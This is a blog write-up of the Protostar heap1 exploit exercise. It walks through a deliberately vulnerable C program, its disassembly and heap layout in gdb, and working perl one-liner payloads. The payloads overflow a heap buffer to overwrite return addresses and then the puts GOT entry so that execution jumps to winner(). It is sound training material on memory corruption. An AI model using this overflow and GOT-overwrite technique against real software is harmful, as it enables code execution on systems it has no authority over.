---
layout: post
title:  "Protostar Heap1 challenge"
date:   2018-05-27 22:26:36 +0530
categories: exploit-exercises protostar heap1
---
[Heap1][heap1-proto-link] protostar exploit exercise introduces us to heap-overflow vulnerabilities and how they can be exploited. [Heap0][heap0-proto-link] was a relatively simple challenge so i have skipped writing about it. The source code for `heap1` is below
{% highlight cpp %}
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>



struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
{% endhighlight %}

Ok. Now let us see the assembly for the vulnerable binary.
{% highlight nasm %}
user@protostar:/opt/protostar/bin$ gdb heap1
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x080484b9 <main+0>:	push   ebp
0x080484ba <main+1>:	mov    ebp,esp
0x080484bc <main+3>:	and    esp,0xfffffff0
0x080484bf <main+6>:	sub    esp,0x20
0x080484c2 <main+9>:	mov    DWORD PTR [esp],0x8
0x080484c9 <main+16>:	call   0x80483bc <malloc@plt>
0x080484ce <main+21>:	mov    DWORD PTR [esp+0x14],eax
0x080484d2 <main+25>:	mov    eax,DWORD PTR [esp+0x14]
0x080484d6 <main+29>:	mov    DWORD PTR [eax],0x1
0x080484dc <main+35>:	mov    DWORD PTR [esp],0x8
0x080484e3 <main+42>:	call   0x80483bc <malloc@plt>
0x080484e8 <main+47>:	mov    edx,eax
0x080484ea <main+49>:	mov    eax,DWORD PTR [esp+0x14]
0x080484ee <main+53>:	mov    DWORD PTR [eax+0x4],edx
0x080484f1 <main+56>:	mov    DWORD PTR [esp],0x8
0x080484f8 <main+63>:	call   0x80483bc <malloc@plt>
0x080484fd <main+68>:	mov    DWORD PTR [esp+0x18],eax
0x08048501 <main+72>:	mov    eax,DWORD PTR [esp+0x18]
0x08048505 <main+76>:	mov    DWORD PTR [eax],0x2
0x0804850b <main+82>:	mov    DWORD PTR [esp],0x8
0x08048512 <main+89>:	call   0x80483bc <malloc@plt>
0x08048517 <main+94>:	mov    edx,eax
0x08048519 <main+96>:	mov    eax,DWORD PTR [esp+0x18]
0x0804851d <main+100>:	mov    DWORD PTR [eax+0x4],edx
0x08048520 <main+103>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048523 <main+106>:	add    eax,0x4
0x08048526 <main+109>:	mov    eax,DWORD PTR [eax]
0x08048528 <main+111>:	mov    edx,eax
0x0804852a <main+113>:	mov    eax,DWORD PTR [esp+0x14]
0x0804852e <main+117>:	mov    eax,DWORD PTR [eax+0x4]
0x08048531 <main+120>:	mov    DWORD PTR [esp+0x4],edx
0x08048535 <main+124>:	mov    DWORD PTR [esp],eax
0x08048538 <main+127>:	call   0x804838c <strcpy@plt>
0x0804853d <main+132>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048540 <main+135>:	add    eax,0x8
0x08048543 <main+138>:	mov    eax,DWORD PTR [eax]
0x08048545 <main+140>:	mov    edx,eax
0x08048547 <main+142>:	mov    eax,DWORD PTR [esp+0x18]
0x0804854b <main+146>:	mov    eax,DWORD PTR [eax+0x4]
0x0804854e <main+149>:	mov    DWORD PTR [esp+0x4],edx
0x08048552 <main+153>:	mov    DWORD PTR [esp],eax
0x08048555 <main+156>:	call   0x804838c <strcpy@plt>
0x0804855a <main+161>:	mov    DWORD PTR [esp],0x804864b
0x08048561 <main+168>:	call   0x80483cc <puts@plt>
0x08048566 <main+173>:	leave  
0x08048567 <main+174>:	ret    
End of assembler dump.
{% endhighlight %}
So now we would first like to how our heap memory is allocated. To do so let us put some breakpoints.
We place break-point before and after first and second malloc calls. First malloc call is for allocating first struct and second malloc call is for allocating string within this. Now we run program with a sample input to see check heap at various positions.
We know from the source code the this binary expects two arguments from command line.
{% highlight nasm %}
Breakpoint 1 at 0x80484c9: file heap1/heap1.c, line 23.
(gdb) b *0x080484ce
Breakpoint 2 at 0x80484ce: file heap1/heap1.c, line 23.
(gdb) b *0x080484e3
Breakpoint 3 at 0x80484e3: file heap1/heap1.c, line 25.
(gdb) b *0x080484e8
Breakpoint 4 at 0x80484e8: file heap1/heap1.c, line 25.
(gdb) r AAAA BBBB
Starting program: /opt/protostar/bin/heap1 AAAA BBBB
(gdb) info proc map
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap1
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap1
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
{% endhighlight %}
Very well. So our binary has no heap memory area before the first malloc call. Kindof expected. On `Continuing` to next breakpoint we see a heap area has been carved out now.
So we then try to see memory area around heap and how it has been created.
{% highlight nasm %}
(gdb) c
Continuing.
(gdb) info proc map
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap1
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap1
	 0x804a000  0x806b000    0x21000          0           [heap]
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
(gdb) x/40x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
{% endhighlight %}
After first malloc call for struct has completed we see that `0x804a004` has value as `0x11`. This basically stores the size for malloc. On moving to position after next malloc the heap is
{% highlight nasm %}
(gdb) x/30x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a020:	0x00000000	0x00020fe1	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x0000000
{% endhighlight %}
So by now value `1` has been saved to priority at `0x804a008`.
`0x804a012` has value `0x0804a018` which tells where the newly malloced char * name will be stored.
The same happens for other two mallocs.
Now we move on to checking this vulnerability.
{% highlight nasm %}
(gdb) b *0x0804853d
Breakpoint 6 at 0x804853d: file heap1/heap1.c, line 32.
(gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGG
Breakpoint 6, main (argc=2, argv=0xbffff844) at heap1/heap1.c:32
32	heap1/heap1.c: No such file or directory.
	in heap1/heap1.c
(gdb) x/30x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x42424242
0x804a020:	0x43434343	0x44444444	0x45454545	0x46464646
0x804a030:	0x47474747	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000
(gdb) c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0x0) at strcpy.c:39
39	strcpy.c: No such file or directory.
	in strcpy.c
{% endhighlight %}
Seems what we wrote to as `FFFF` ie `0x46464646` was the destination address for second `strcpy`.
Our goal is to execute `winner` function. So we could overwrite return address of `main` with address of winner. Or we could also overwrite return address of second strcpy with winner's.
We first get address of winner and return address of main and second strcpy..
{% highlight nasm %}
(gdb) print winner
$1 = {void (void)} 0x8048494 <winner>
(gdb) x/x $ebp+0x4
0xbffff79c:	0xb7eadc76
(gdb) b *0x08048555
Breakpoint 7 at 0x8048555: file heap1/heap1.c, line 32.
(gdb) c
Continuing.
Breakpoint 7, 0x08048555 in main (argc=2, argv=0xbffff844) at heap1/heap1.c:32
32	in heap1/heap1.c
(gdb) s
*__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0x0) at strcpy.c:39
39	strcpy.c: No such file or directory.
	in strcpy.c
(gdb) x/x $ebp+0x4
0xbffff76c:	0x0804855a
{% endhighlight %}
Recalling return address is `0x4` away from `$ebp`. Also to get location where return address from second strcpy is stored, we break just before strcpy and step into us `s`. This would execute strcpy, creating a stack for it with return address.
Exploit will work as the first strcpy call will, after unchecked writing 20 dummy bytes to heap, overwrite destination address of second strcpy. And second strcpy will write this modified address ie `location of return address` with address of winner.
{% highlight nasm %}
(gdb) r `perl -e 'print "A"x20 . "\x9c\xf7\xff\xbf" . " " . "\x94\x84\x04\x08"'`
Starting program: /opt/protostar/bin/heap1 `perl -e 'print "A"x20 . "\x9c\xf7\xff\xbf" . " " . "\x94\x84\x04\x08"'`
and that's a wrap folks!
and we have a winner @ 1527765672
Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) r `perl -e 'print "A"x20 . "\x6c\xf7\xff\xbf" . " " . "\x94\x84\x04\x08"'`
Starting program: /opt/protostar/bin/heap1 `perl -e 'print "A"x20 . "\x6c\xf7\xff\xbf" . " " . "\x94\x84\x04\x08"'`
and we have a winner @ 1527765683
Program received signal SIGSEGV, Segmentation fault.
0xbffff70a in ?? ()
{% endhighlight %}
So we are able to execute winner from `gdb`. Notice how modifying strcpy return address does not output `and that's a wrap folks!` coz printf is not executed.
But when i tried running outside gdb, i was unsuccessful in both cases.
{% highlight nasm %}
user@protostar:/opt/protostar/bin$ ./heap1 `perl -e 'print "A"x20 . "\x9c\xf7\xff\xbf" . " " . "\x94\x84\x04\x08"'`
and that's a wrap folks!
user@protostar:/opt/protostar/bin$ ./heap1 `perl -e 'print "A"x20 . "\x6c\xf7\xff\xbf" . " " . "\x94\x84\x04\x08"'`
and that's a wrap folks!
{% endhighlight %}
This was probably due to stack changing when working outside gdb.
So i tried using Global Offset Table now for exploit. I had read about it while working on [format4][format4-proto-link] exercise.After 2nd `strcpy`, there is a call to `puts` for printing. `0x08048561 <main+168>:	call   0x80483cc <puts@plt>`. Here call is directed to a location in `plt` table which further points to `GOT` table.
{% highlight nasm %}
(gdb) disas 0x80483cc
Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774
0x080483d2 <puts@plt+6>:	push   0x30
0x080483d7 <puts@plt+11>:	jmp    0x804835c
End of assembler dump.
(gdb) x/x 0x8049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483d2
{% endhighlight %}
`0x8049774` is pointer to entry in `GOT` which has value `0x080483d2`. This value is what needs to be
overwritten with winner address. So with a change to our desination address for second strcpy we are able to execute winner.
{% highlight nasm %}
(gdb) r `perl -e 'print "A"x20 . "\x74\x97\x04\x08" . " " . "\x94\x84\x04\x08"'`
Breakpoint 1, 0x08048561 in main (argc=3, argv=0xbffff844) at heap1/heap1.c:34
(gdb) disas 0x80483cc
Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774
0x080483d2 <puts@plt+6>:	push   0x30
0x080483d7 <puts@plt+11>:	jmp    0x804835c
(gdb) x/x 0x8049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:	0x08048494
(gdb) c
Continuing.
and we have a winner @ 1527769804
Program exited with code 042.
{% endhighlight %}
{% highlight shell %}
user@protostar:/opt/protostar/bin$ ./heap1 `perl -e 'print "A"x20 . "\x74\x97\x04\x08" . " " . "\x94\x84\x04\x08"'`
and we have a winner @ 1527769887
{% endhighlight %}
Since `GOT` address are stable both inside and out of gdb we are also able to get to winner w/o gdb.

[heap1-proto-link]:https://exploit-exercises.com/protostar/heap1/
[heap0-proto-link]:https://exploit-exercises.com/protostar/heap0/
[format4-proto-link]:https://exploit-exercises.com/protostar/format4
